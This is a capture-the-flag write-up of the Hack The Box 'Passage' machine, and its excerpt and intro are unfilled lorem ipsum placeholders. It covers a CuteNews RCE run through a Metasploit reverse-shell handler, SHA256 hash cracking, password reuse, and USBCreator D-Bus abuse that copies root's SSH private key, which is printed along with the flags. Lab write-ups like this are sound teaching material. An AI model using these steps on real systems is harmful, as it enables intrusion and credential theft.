---
layout: single
title: Passage - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-09-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-passage/passage_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-passage/passage_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@nidus:/git/htb# nmap -Pn -n -sC -sV 10.10.10.206
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
    |   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
    |_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Passage News
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    DIRB:
    -

    NIKTO:
    -


2. Browsing the webserver we are presented with a simple News page. They inform us that fail2ban is installed making us unable to
   enumerate with DIRB and/or Nikto. From the page we can extract usernames from the different posts;

    admin
    kim swift
    sid meier
    paul coler

   Pressing the RSS-button we are forwarded to http://10.10.10.206/CuteNews/rss.php, the folder CuteNews is new to us. Browsing only
   that folder and we are presented with a login prompt for CuteNews 2.1.2; http://10.10.10.206/CuteNews/

   root@nidus:/git/htb/passage# searchsploit cutenews
     ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
      Exploit Title                                                                                                              |  Path
     ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
     [..]
     CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                | php/remote/46698.rb
     CuteNews 2.1.2 - Arbitrary File Deletion                                                                                    | php/webapps/48447.txt
     CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                        | php/webapps/48458.txt

   root@nidus:/git/htb/passage# searchsploit -x php/remote/46698.rb | xclip
   root@nidus:/git/htb/passage# vi cutenews_avatar_rce.rb
   root@nidus:~/.msf4/modules# mkdir -p exploits/unix/webapp/
   root@nidus:~/.msf4/modules# mv /git/htb/passage/cutenews_avatar_rce.rb exploits/unix/webapp/

   As the exploit is authenticated, Register a new user and enter it's credentials in the exploit code.

   msf5 exploit(unix/webapp/cutenews_avatar_rce) > set rhosts 10.10.10.206
   msf5 exploit(unix/webapp/cutenews_avatar_rce) > set lhost 10.10.14.12
   msf5 exploit(unix/webapp/cutenews_avatar_rce) > set lport 4400
   msf5 exploit(unix/webapp/cutenews_avatar_rce) > set password playerthree
   msf5 exploit(unix/webapp/cutenews_avatar_rce) > set username playerthree
   msf5 exploit(unix/webapp/cutenews_avatar_rce) > run

     [*] Started reverse TCP handler on 10.10.14.12:4400
     [*] http://10.10.10.206:80 - CuteNews is 2.1.2
     [+] Authentication was successful with user: playerthree
     [*] Trying to upload cuqznmgo.php
     [+] Upload successfully.
     [*] Sending stage (38288 bytes) to 10.10.10.206
     [*] Meterpreter session 1 opened (10.10.14.12:4400 -> 10.10.10.206:44244) at 2020-09-10 12:02:16 +0200

     meterpreter > shell
       Process 1984 created.
       Channel 0 created.

       whoami
       www-data


3. Enumerate continue your enumeration. In the webserver we find a users map (/var/www/html/CuteNews/cdata/users) containing a lot of base64 encoded data.

   cat lines
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=
     <?php die('Direct call - access denied'); ?>
     <?php die('Direct call - access denied'); ?>
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=
     <?php die('Direct call - access denied'); ?>
     YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0=

   Going through all the base64 rows we find a list of usernames and password (SHA256) hashes. Add them all to lists and try to crack them.
     root@nidus:/git/htb/passage# cat hashes-all.txt
      7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
      4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
      e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
      f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
      4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
      731555aa24389a30b3d0e5dfb9730baffc2c97a2b07493c7bed8e4317657bde0

    root@nidus:/git/htb/passage# hashcat -a0 -m1400 hashes-all.txt /usr/share/wordlists/rockyou.txt -o cracked-all.txt
      [..]
      Status...........: Exhausted
      Hash.Name........: SHA2-256
      Hash.Target......: hashes-all.txt

    root@nidus:/git/htb/passage# cat cracked-all.txt
      e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1

  The cracked password is for the user paul. In our RCE session we can verify that paul has a active account, lets try for password
  re-use.

  su paul
    su: must be run from a terminal
  python -c 'import pty;pty.spawn("/bin/bash")'
  www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
    Password: atlanta1

  paul@passage:/var/www/html/CuteNews/cdata/users$


4. Grab user.txt, and download id_rsa

    paul@passage:/var/www/html/CuteNews/cdata/users$ cd /home/paul
    paul@passage:~$ cat user.txt
      c8160b868ed602348c15191205f76ab8


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Change user from Paul to Navdav using the SSH-key.

    paul@passage:~/.ssh$ ssh nadav@10.10.10.206 -i id_rsa
      Last login: Thu Sep 10 04:29:35 2020 from 10.10.10.206
    nadav@passage:~$


  When enumerating there's a lot of things pointing towards dbus, and specifically com.ubuntu.USBCreator.

    LINPEAS:
    [+] Modified interesting files in the last 5mins
      /home/nadav/.dbus/session-bus/4a23f1f5846e4890b0997d28c0fdd9e3-0
      /home/nadav/.local/share/keyring-crack

    nadav@passage:~$ cat .viminfo
      [..]
      # File marks:
      '0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf


2. Dig deeper into dbus USBCreator and we find a few interesting articles, all linked below.

    To verify it's a valid path towards root we check the process and confirm it's run by root.
      nadav@passage:~$ busctl status com.ubuntu.USBCreator
        PID=33852
        [..]

      nadav@passage:~$ ps aux | grep 33852
        root      33852  0.0  0.4 235548 20052 ?        Sl   05:02   0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper

    Enumerate the dbus service to find it's path (tree) and a method (introspect) to exploit.

      nadav@passage:~$ busctl tree com.ubuntu.USBCreator
      └─/com
        └─/com/ubuntu
          └─/com/ubuntu/USBCreator

      nadav@passage:~$ busctl introspect com.ubuntu.USBCreator /com/ubuntu/USBCreator
        NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
        com.ubuntu.USBCreator               interface -         -            -
        .Image                              method    ssb       -            -
        .KVMOk                              method    -         b            -
        .KVMTest                            method    sa{ss}    -            -
        .Shutdown                           method    -         -            -
        .Unmount                            method    s         -            -
        .Progress                           signal    u         -            -
        org.freedesktop.DBus.Introspectable interface -         -            -
        .Introspect                         method    -         s            -


3. Exploit dbus USBCreator with the found information, start by doing a simple PoC.

   The purpose of this PoC is to copy the content of /dev/shm/p3/a.txt and write it to /dev/shm/a.txt as user root.

    nadav@passage:~$ echo "Test" > /dev/shm/p3/a.txt
    nadav@passage:~$ ls -al /dev/shm/ | grep a.txt

    nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/p3/a.txt /dev/shm/a.txt true
    nadav@passage:~$ ls -al /dev/shm/ | grep a.txt
      -rw-r--r--  1 root  root         5 Sep 10 06:23 a.txt

   The PoC is a success! Now we can do the same with either root.txt, id_rsa or any other file of interest.


4. Do the exploit for real and grab root.txt.

    nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/a.txt true
      ()
    nadav@passage:~$ cat /dev/shm/a.txt
      -----BEGIN RSA PRIVATE KEY-----
      MIIEogIBAAKCAQEAth1mFSVw6Erdhv7qc+Z5KWQMPtwTsT9630uzpq5fBx/KKzqZ
      B7G3ej77MN35+ULlwMcpoumayWK4yZ/AiJBm6FEVBGSwjSMpOGcNXTL1TClGWbdE
      +WNBT+30n0XJzi/JPhpoWhXM4OqYLCysX+/b0psF0jYLWy0MjqCjCl/muQtD6f2e
      jc2JY1KMMIppoq5DwB/jJxq1+eooLMWVAo9MDNDmxDiw+uWRUe8nj9qFK2LRKfG6
      U6wnyQ10ANXIdRIY0bzzhQYTMyH7o5/sjddrRGMDZFmOq6wHYN5sUU+sZDYD18Yg
      ezdTw/BBiDMEPzZuCUlW57U+eX3uY+/Iffl+AwIDAQABAoIBACFJkF4vIMsk3AcP
      0zTqHJ1nLyHSQjs0ujXUdXrzBmWb9u0d4djZMAtFNc7B1C4ufyZUgRTJFETZKaOY
      8q1Dj7vJDklmSisSETfBBl1RsiqApN5DNHVNIiQE/6CZNgDdFTCnzQkiUPePic8R
      P1St2AVP1qmMvVimDFSJoiOEUfzidepXEEUQrByNmOJDtewMSm4aGz60ced2XCBr
      GTt/wyo0y5ygRJkUcC+/o4/r2DQdrjCbeuyzAzzhFKQQx6HN5svzpi0jOWC0cB0W
      GmAp5Q7fIFhuGyrxShs/BEuQP7q7Uti68iwEh2EZSlaMcBFEJvirWtIO7U3yIHYI
      HnNlLvECgYEA7tpebu84sTuCarHwASAhstiCR5LMquX/tZtHi52qKKmYzG6wCCMg
      S/go8DO8AX5mldkegD7KBmTeMNPKp8zuE8s+vpErCBH+4hOq6U1TwZvDQ2XY9HBz
      aHz7vG5L8E7tYpJ64Tt8e0DcnQQtW8EqFIydipO0eLdxkIGykjWuYGsCgYEAwzBM
      UZMmOcWvUULWf65VSoXE270AWP9Z/XuamG/hNpREDZEYvHmhucZBf1MSGGU/B7MC
      YXbIs1sS6ehDcib8aCVdOqRIqhCqCd1xVnbE0T4F2s1yZkct09Bki6EuXPDo2vhy
      /6v6oP+yT5z854Vfq0FWxmDUssMbjXkVLKIZ3skCgYAYvxsllzdidW3vq/vXwgJ7
      yx7EV5tI4Yd6w1nIR0+H4vpnw9gNH8aK2G01ZcbGyNfMErCsTNUVkIHMwUSv2fWY
      q2gWymeQ8Hxd4/fDMDXLS14Rr42o1bW/T6OtRCgt/59spQyCJW2iP3gb9IDWjs7T
      TjZMUz1RfIARnr5nk5Q7fQKBgGESVxJGvT8EGoGuXODZAZ/zUQj7QP4B2G5hF2xy
      T64GJKYeoA+z6gNrHs3EsX4idCtPEoMIQR45z/k2Qry1uNfOpUPxyhWR/g6z65bV
      sGJjlyPPAvLsuVTbEfYDLfyY7yVfZEnU7Os+3x4K9BfsU7zm3NIB/CX/NGeybR5q
      a7VJAoGANui4oMa/9x8FSoe6EPsqbUcbJCmSGPqS8i/WZpaSzn6nW+636uCgB+EP
      WOtSvOSRRbx69j+w0s097249fX6eYyIJy+L1LevF092ExQdoc19JTTKJZiWwlk3j
      MkLnfTuKj2nvqQQ2fq+tIYEhY6dcSRLDQkYMCg817zynfP0I69c=
      -----END RSA PRIVATE KEY-----

    root@nidus:/git/htb/passage# ssh root@passage.htb -i root_id-rsa
      load pubkey "root_id-rsa": invalid format
      Last login: Thu Sep 10 04:57:24 2020 from 10.10.14.10
      root@passage:~# hostname && id
        passage
        uid=0(root) gid=0(root) groups=0(root)

      root@passage:~# cat root.txt
        866759f7ccb3f776b2fd176279971213


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


CuteNews RCE (Authenticated)
  https://github.com/rapid7/metasploit-framework/issues/13246
  https://www.exploit-db.com/exploits/46698

DBus Priv Esc
  https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
  https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
  https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
